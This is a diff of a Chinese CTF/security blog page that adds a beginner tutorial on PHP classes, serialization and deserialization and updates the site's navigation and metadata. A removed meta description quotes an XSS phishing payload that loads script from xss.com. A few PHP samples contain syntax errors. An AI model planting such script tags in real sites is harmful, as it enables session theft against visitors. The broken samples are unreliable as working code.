@@ -6,36 +6,26 @@
   <meta name="keywords" content=" Web ">
   <meta name="description" content="反序列化从入门到入土 | f4k3r&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="什么时候可以进行钓鱼？①网站存在XSS漏洞 ②站点已经getshell的情况 在存在漏洞处放入payload &lt;sCRiPt sRC&#x3D;xss.com&#x2F;asdq&gt;&lt;&#x2F;sCrIpT&gt; 具体执行可以先放入探针，测试通过对方的ua头，检查对面电脑的基本情况 66analytics这个工具可以记录在后台记录整个操作的视频，甚至还可以记录鼠标的点击和移动过">
+<meta name="description" content="Web去年：php&#x2F;ctf php&#x2F;pwn 今年：php&#x2F;ctf java&#x2F;web pwn PHP： 实际上在比赛开始之前，靶场就能访问，没有做限制，比赛之前就看到php，收手机晚，基本大家都动了小心思，之前缺少了一个经验，这次比赛awd需要自己探测发现端口和服务，导致没有这个思维，应该先去扫所有题目端口，扫描不要扫常见端口，扫1-65535，发现服务 比赛">
 <meta property="og:type" content="article">
-<meta property="og:title" content="初探XSS钓鱼">
-<meta property="og:url" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/index.html">
+<meta property="og:title" content="领航杯线下AWD复盘">
+<meta property="og:url" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/index.html">
 <meta property="og:site_name" content="f4k3r&#39;s blog">
-<meta property="og:description" content="什么时候可以进行钓鱼？①网站存在XSS漏洞 ②站点已经getshell的情况 在存在漏洞处放入payload &lt;sCRiPt sRC&#x3D;xss.com&#x2F;asdq&gt;&lt;&#x2F;sCrIpT&gt; 具体执行可以先放入探针，测试通过对方的ua头，检查对面电脑的基本情况 66analytics这个工具可以记录在后台记录整个操作的视频，甚至还可以记录鼠标的点击和移动过">
+<meta property="og:description" content="Web去年：php&#x2F;ctf php&#x2F;pwn 今年：php&#x2F;ctf java&#x2F;web pwn PHP： 实际上在比赛开始之前，靶场就能访问，没有做限制，比赛之前就看到php，收手机晚，基本大家都动了小心思，之前缺少了一个经验，这次比赛awd需要自己探测发现端口和服务，导致没有这个思维，应该先去扫所有题目端口，扫描不要扫常见端口，扫1-65535，发现服务 比赛">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021122924451.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021132700760.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021132840979.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021133351242.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021134820160.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021134841615.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141603840.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141712979.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141815694.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141938027.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142006376.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142025235.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142109438.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142128347.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142247468.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142357860.png">
-<meta property="og:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142512433.png">
-<meta property="article:published_time" content="2024-10-18T08:02:40.000Z">
-<meta property="article:modified_time" content="2024-10-21T06:43:02.832Z">
+<meta property="og:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027221051529.png">
+<meta property="og:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027213412240.png">
+<meta property="og:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027215450392.png">
+<meta property="og:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027215512193.png">
+<meta property="og:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027220009409.png">
+<meta property="og:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027220044907.png">
+<meta property="og:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027220143891.png">
+<meta property="article:published_time" content="2024-10-27T12:30:06.000Z">
+<meta property="article:modified_time" content="2024-10-27T14:10:54.614Z">
 <meta property="article:author" content="f4k3r">
-<meta property="article:tag" content="Web">
+<meta property="article:tag" content="AWD">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021122924451.png">
+<meta name="twitter:image" content="http://example.com/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/image-20241027221051529.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -98,7 +88,7 @@
     <li>
         <div class="all active" data-rel="全部文章">全部文章
             
-                <small>(84)</small>
+                <small>(92)</small>
             
         </div>
     </li>
@@ -118,7 +108,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="84">
+<input type="hidden" id="yelog_site_posts_number" value="92">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -165,6 +155,10 @@
     <div class="tag-wrapper">
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>大数据</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>反序列化</a>
             </li>
         
@@ -178,6 +172,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>随想</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>AWD</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -218,6 +216,78 @@
 
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/28/%E6%88%98%E8%83%9C%E4%BA%86%E5%BF%83%E9%AD%94/"
+           data-tag="随想"
+           data-author="" >
+            <span class="post-title" title="战胜了心魔">战胜了心魔</span>
+            <span class="post-date" title="2024-10-28 00:32:56">2024/10/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/27/%E9%A2%86%E8%88%AA%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E5%A4%8D%E7%9B%98/"
+           data-tag="AWD"
+           data-author="" >
+            <span class="post-title" title="领航杯线下AWD复盘">领航杯线下AWD复盘</span>
+            <span class="post-date" title="2024-10-27 20:30:06">2024/10/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/27/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDdll/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="内存加载dll">内存加载dll</span>
+            <span class="post-date" title="2024-10-27 14:26:46">2024/10/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/26/AWD-XM10-26%E5%A4%8D%E7%9B%98/"
+           data-tag="AWD"
+           data-author="" >
+            <span class="post-title" title="AWD-XM10.26复盘">AWD-XM10.26复盘</span>
+            <span class="post-date" title="2024-10-26 20:01:22">2024/10/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/26/AWD%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"
+           data-tag="AWD"
+           data-author="" >
+            <span class="post-title" title="AWD从入门到入土">AWD从入门到入土</span>
+            <span class="post-date" title="2024-10-26 14:31:41">2024/10/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/24/BuildCTF-WP/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="BuildCTF-WP">BuildCTF-WP</span>
+            <span class="post-date" title="2024-10-24 22:43:31">2024/10/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%AD%A6%E4%B9%A0-%E5%81%8F%E5%BA%94%E8%AF%95/"
+           data-tag="大数据"
+           data-author="" >
+            <span class="post-title" title="数据库原理及其应用学习-偏应试">数据库原理及其应用学习-偏应试</span>
+            <span class="post-date" title="2024-10-23 22:26:08">2024/10/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%A4%8D%E7%8E%B0/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="强网拟态复现">强网拟态复现</span>
+            <span class="post-date" title="2024-10-21 18:08:04">2024/10/21</span>
+        </a>
         
         
         <a  class="全部文章 "
@@ -1012,7 +1082,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-10-19 17:24:19'>2024-10-16 20:19</time>
+            发布时间 : <time class="date" title='最后更新: 2024-10-26 17:52:22'>2024-10-16 20:19</time>
         
     </div>
     <div class="article-meta">
@@ -1023,7 +1093,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="toc-text">面向对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-text">类的定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF"><span class="toc-text">继承</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-text">类与对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-text">类的结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-text">类的内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%92%8C%E8%B5%8B%E5%80%BC"><span class="toc-text">实例化和赋值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6%E4%BB%8B%E7%BB%8D"><span class="toc-text">类的修饰符介绍</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">序列化基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">序列化的作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E6%96%B9%E5%BC%8F"><span class="toc-text">表达方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3"><span class="toc-text">对象序列化的详细讲解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-text">反序列化的特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">反序列化的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BE%8B%E9%A2%98"><span class="toc-text">反序列化漏洞例题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B"><span class="toc-text">魔术方法简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">什么是魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">魔术方法的作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3%E6%9C%BA%E5%88%B6"><span class="toc-text">魔术方法相关机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#construct"><span class="toc-text">__construct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct"><span class="toc-text">__destruct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">__sleep()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-text">__wakeup()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-text">__toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke"><span class="toc-text">__invoke()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call"><span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#callStatic"><span class="toc-text">__callStatic()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get"><span class="toc-text">__get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#set"><span class="toc-text">__set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isset"><span class="toc-text">__isset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unset"><span class="toc-text">__unset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clone"><span class="toc-text">__clone()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop%E9%93%BE%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">pop链前置知识</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1039,7 +1109,562 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p>程序开发：面向过程vs面向对象</p>
+<p>面向过程</p>
+<p>面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，再一步一步的具体步骤中再按顺序调用函数。</p>
+<p>面向对象</p>
+<p>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；</p>
+<p>对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。</p>
+<h3 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h3><p>类是定义了一件事情的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。对象是具有类类型的变量，是对类的实例。</p>
+<p>内部构成：成员变量（属性）+成员函数（方法）</p>
+<p>法师、坦克、刺客，像moba这种游戏的每种职业在写底层代码的时候也都会分成一个一个的类。</p>
+<p><strong>成员变量（属性）</strong></p>
+<p>定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。</p>
+<p><strong>成员函数（方法）</strong></p>
+<p>定义在类的内部，可用于访问对象的数据</p>
+<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。</p>
+<p>在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容</p>
+<p>父类：一个类被其他类继承，可将该类成为父类，或基类，超类。</p>
+<p>子类：一个类继承其他类称为子类，也可称为派生类 。</p>
+<h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><p>类是对象的抽象，而对象是类的具体实例。类是想法，把类实例化(new)，调用具体值后就变成了对象。</p>
+<p>类的结构</p>
+<p>类的内容</p>
+<p>实例化和赋值</p>
+<p>类的修饰符介绍</p>
+<h4 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h4><p>类：定义类名、定义成员变量（属性）、定义成员函数（方法）</p>
+<pre><code>class Class_Name&#123;
+//成员变量声明
+//成员函数声明
+&#125;
+</code></pre>
+<h4 id="类的内容"><a href="#类的内容" class="headerlink" title="类的内容"></a>类的内容</h4><p>创建一个类</p>
+<pre><code class="php">&lt;?php
+class hero&#123;
+    var $name = &#39;benben&#39;;
+    var $sex;
+    function jineng($var1)&#123;
+        echo $this -&gt; name; //调用当前类的成员属性需要加上$this,如果直接写echo $name是会报错的。
+        echo $var1;
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>这个代码运行以后不会有任何结果</p>
+<p>只有加上$cyj &#x3D;  new hero();，这样才会生成一个对象</p>
+<pre><code class="php">&lt;?php
+class hero&#123;
+    var $name = &#39;benben&#39;;
+    var $sex;
+    function jineng($var1)&#123;
+        echo $this -&gt; name; //调用当前类的成员属性需要加上$this,如果直接写echo $name是会报错的。
+        echo $var1;
+    &#125;
+&#125;
+$cyj = new hero();
+$cyj-&gt;name = &#39;程咬金&#39;
+$cyj-&gt;sex = &#39;男&#39;;
+print_r($cyj);
+?&gt;
+</code></pre>
+<p>输出结果</p>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241021155153821.png"></p>
+<p>如果将$cyj-&gt;sex &#x3D; ‘男’; 注释掉，他同样会调用sex的成员属性，但是成员方法为空</p>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241021155327749.png"></p>
+<h4 id="实例化和赋值"><a href="#实例化和赋值" class="headerlink" title="实例化和赋值"></a>实例化和赋值</h4><pre><code class="php">&lt;?php
+class hero&#123;
+    var $name;
+    var $sex;
+    function jineng($var1)&#123;
+        echo $this-&gt;name;
+        echo $var1;
+    &#125;
+&#125;
+$cyj = new hero(); //实例化类hero()为对象cyj
+$cyj-&gt;name=&#39;chengyaojin&#39;; //参数赋值
+$cyj-&gt;sex=&#39;man&#39;;  
+$cyj-&gt;jineng(&#39;zuofan&#39;); //调用函数
+print_r($cyj); //打印对象cyj
+?&gt;
+</code></pre>
+<h4 id="类的修饰符介绍"><a href="#类的修饰符介绍" class="headerlink" title="类的修饰符介绍"></a>类的修饰符介绍</h4><p>在类中直接声明的变量称为成员属性（也可以称为成员变量）</p>
+<p>可以在类中声明多个变量，即对象中可以有多个成员属性，每个变量都存储“对象”不同的属性信息。</p>
+<p>访问权限修饰符：对属性的定义</p>
+<p>常用访问权限修饰符：</p>
+<p>public：公共的，在类的内部、子类中或者类的外部都可以使用，不受限制；</p>
+<p>可以在任何地方进行调用</p>
+<p>protected：受保护的，在类的内部、子类中可以使用，但不能在类的外部使用；</p>
+<p>private：私有的，只能在类的内部使用，在类的外部或者子类中都无法使用。</p>
+<pre><code class="php">&lt;?php
+class hero&#123;
+    public $name=&#39;chengyaojin&#39;;
+    private = $sex=&#39;man&#39;;
+    protected $shengao=&#39;165&#39;;
+    function jineng($var1)&#123;
+        echo $this-&gt;name;
+        echo $var1;
+    &#125;
+&#125;
+$cyj = new hero();
+echo $cyj-&gt;name;
+echo $cyj-&gt;sex;
+echo $cyj-&gt;shengao;
+?&gt;
+</code></pre>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241021161355987.png"></p>
+<p>此时运行这个代码，如果你想调用sex这个类的时候它会发生报错</p>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241021161939986.png"></p>
+<p>报错产生原因是在类的外部（或类的子类中）试图直接访问了这个私有属性$sex，导致了错误。</p>
+<h3 id="序列化基础知识"><a href="#序列化基础知识" class="headerlink" title="序列化基础知识"></a>序列化基础知识</h3><p>序列化的作用</p>
+<p>序列化之后的表达方式&#x2F;格式</p>
+<p>对象序列化的详细讲解</p>
+<h4 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h4><p>序列化(Serialization)是将对象的状态信息（属性）转换为可以存储或传输的形式的过程、</p>
+<p>将对象或者数组转化为可存储&#x2F;传输的字符串。</p>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241021163151033.png"></p>
+<h4 id="表达方式"><a href="#表达方式" class="headerlink" title="表达方式"></a>表达方式</h4><pre><code class="php">&lt;?php
+    $a = null;
+    echo serialize($a);
+?&gt;
+</code></pre>
+<p>所有格式第一位都是数据类型的英文字母简写</p>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241021163420101.png"></p>
+<p>输出结果就是null，什么都木有</p>
+<p><strong>注</strong>：PHP序列化后的基本类型表达</p>
+<pre><code>布尔值(bool) b:value =&gt; b:0
+整数型(int) i:value =&gt; i:1
+字符串型(str) s:length: &quot;value&quot;; =&gt; s:4:&quot;aaaa&quot;
+数组型(array) a:&lt;length&gt;:&#123;key,value pairs&#125;; =&gt; a:1:&#123;i:1;s:1:&quot;a&quot;&#125;
+对象型(object) O:&lt;class_name_length&gt;
+NULL型：N
+</code></pre>
+<h4 id="对象序列化的详细讲解"><a href="#对象序列化的详细讲解" class="headerlink" title="对象序列化的详细讲解"></a>对象序列化的详细讲解</h4><p><strong>基本理解</strong></p>
+<pre><code class="php">&lt;?php
+    class test&#123;
+        public $pub = &#39;benben&#39;;
+        function jineng()&#123;
+            echo $this-&gt;pub;
+        &#125;
+&#125;
+$a = new test();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>运行结果：O:4:”test”:1:{s:3:”pub”;s:6:”benben”;}</p>
+<p>O代表对象；4代表对象的长度为4；test是序列化的对象的名称；1表示这个对象中存在1个属性；第1个属性s表示是字符串；3表示属性名的长度，后面说明属性名称是pub；第2个属性是s表示是字符串，6表示属性名的长度，后面说明属性名称是benben</p>
+<pre><code class="php">&lt;?php
+class test&#123;
+    private $pub = &#39;benben&#39;;
+    function jineng()&#123;
+        echo $this-&gt;pub;
+    &#125;
+&#125;
+$a = new test();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p>运行结果：O:4:”test”:1:{s:9:”testpub”;s:6:”benben”;}</p>
+<p>private私有属性序列化时，在变量名前加“%00类名%00”</p>
+<p>因此这里的testpub长度会显示9，相当于7+2，%00就相当于Null</p>
+<pre><code class="php">&lt;?php
+    class test&#123;
+        var $pub = &#39;benben&#39;;
+        function jineng()&#123;
+            echo $this -&gt; pub;
+        &#125;
+    &#125;
+    class test2&#123;
+        var $ben;
+        function __construct()&#123;
+            $this-&gt;ben=new test();
+        &#125;
+    &#125;
+    $a = new test2();
+    echo serialize($a);
+?&gt;
+</code></pre>
+<p>把一个对象赋值给成员属性，序列化后，序列化的对象里面包含了一个序列化的对象。</p>
+<p>运行结果：O:5:”test2”:1:{s:3:”ben”;O:4:”test”:1:{s:3:”pub”;s:6:”benben”;}}</p>
+<p>对象$a在实例化类’test2’时调用另一个类’test’实例化后的对象</p>
+<h3 id="反序列化的特性"><a href="#反序列化的特性" class="headerlink" title="反序列化的特性"></a>反序列化的特性</h3><p>1、反序列化之后的内容为一个对象；</p>
+<p>2、反序列化生成的对象里的值，由反序列化里的值提供；与原有类预定义的值无关；</p>
+<p>3、反序列化不触发类的成员方法；需要调用方法后才能触发；</p>
+<h3 id="反序列化的作用"><a href="#反序列化的作用" class="headerlink" title="反序列化的作用"></a>反序列化的作用</h3><p>将序列化后的参数还原成实例化的对象。</p>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241021175017183.png"></p>
+<pre><code class="php">&lt;?php
+class test&#123;
+    public $a = &#39;benben&#39;;
+    protected $b = 666;
+    private $c = false;
+    public function displayVar()&#123;
+        echo $this-&gt;a;
+    &#125;
+&#125;
+$d = new test();
+$d = serialize($d);
+ echo urlencode($d);
+$a = urlencode($d);
+$b = unserialize(urldecode($a));
+var_dump($b);
+?&gt;
+</code></pre>
+<p>输出结果：</p>
+<pre><code>O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22benben%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A666%3Bs%3A7%3A%22%00test%00c%22%3Bb%3A0%3B%7D
+object(test)#1 (3) &#123;
+  [&quot;a&quot;]=&gt;
+  string(6) &quot;benben&quot;
+  [&quot;b&quot;:protected]=&gt;
+  int(666)
+  [&quot;c&quot;:&quot;test&quot;:private]=&gt;
+  bool(false)
+&#125;
+</code></pre>
+<p>成员属性反序列化后生成的字符串和其本身就已经没有关系，反序列化生成的对象里的值，由反序列化的值（字符串$a）提供；与原有类预定义的值无关</p>
+<pre><code class="php">&lt;?php
+class test&#123;
+    public $a = &#39;benben&#39;;
+    protected $b = 666;
+    private $c = false;
+    public function displayVar()&#123;
+        echo $this-&gt;a;
+    &#125;
+&#125;
+$d = &#39;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:8:&quot;dazhuang&quot;;s:4:&quot;%00*%00b&quot;;i:888;s:7:&quot;%00test%00c&quot;;b:1;&#125;&#39;;
+$e = urldecode($d);
+$f = unserialize($e);
+$f-&gt;displayVar();
+?&gt;
+</code></pre>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241022172534883.png"></p>
+<p>成员方法得从类来，只有类还在才能进行反序列化，如果类不在了就无法进行调用了，就会直接报错，并且当你将序列化语句进行修改时，一定要都修改对，比如这里的dazhuang是8个字符，而前面的benben是6个字符，如果你修改成了dazhuang却没有改字符个数，那么也会报错的</p>
